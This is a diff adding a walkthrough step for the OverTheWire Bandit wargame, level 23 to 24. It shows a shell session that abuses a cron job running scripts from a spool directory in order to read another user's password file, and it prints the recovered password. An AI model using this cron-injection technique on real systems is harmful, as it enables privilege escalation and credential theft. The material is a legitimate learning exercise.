@@ -556,7 +556,47 @@ bandit22@bandit:~$
 ---
 ### [Level 23 → Level 24](http://overthewire.org/wargames/bandit/bandit24.html)
 ```bash
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
 
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:~$ mkdir /tmp/bam; chmod 777 /tmp/bam; cd /tmp/bam
+bandit23@bandit:/tmp/bam$ ls -la
+total 716
+drwxrwxrwx    2 bandit23 bandit23   4096 Jul 31 17:36 .
+drwxrwx-wt 2911 root     root     724992 Jul 31 17:38 ..
+bandit23@bandit:/tmp/bam$ vi bam.sh
+bandit23@bandit:/tmp/bam$ chmod 777 bam.sh 
+bandit23@bandit:/tmp/bam$ cat bam.sh 
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/bam/flag
+bandit23@bandit:/tmp/bam$ mv bam.sh  /var/spool/bandit24/
+bandit23@bandit:/tmp/bam$ ls -la
+total 720
+drwxrwxrwx    2 bandit23 bandit23   4096 Jul 31 17:40 .
+drwxrwx-wt 2911 root     root     724992 Jul 31 17:41 ..
+-rw-rw-r--    1 bandit23 bandit23      0 Jul 31 17:40 flag
+bandit23@bandit:/tmp/bam$ cat flag 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/bam$
 ```
 ---
 ### [Level 24 → Level 25](http://overthewire.org/wargames/bandit/bandit25.html)
